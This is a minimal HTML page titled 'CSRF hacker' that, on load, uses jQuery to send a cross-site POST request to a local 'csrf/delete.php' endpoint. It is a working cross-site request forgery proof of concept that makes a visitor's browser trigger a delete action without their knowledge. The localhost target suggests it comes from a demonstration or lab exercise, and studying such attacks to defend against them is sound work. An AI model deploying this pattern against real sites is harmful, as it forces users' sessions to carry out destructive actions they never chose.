<!DOCTYPE html>
<html>
<head>
	<title>CSRF hacker</title>
	<meta charset="utf-8">

	<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
</head>
<body>
	<script>
		$.ajax({
			'url': 'http://localhost/csrf/delete.php',
			'type': 'post'
		})
	</script>
</body>
</html>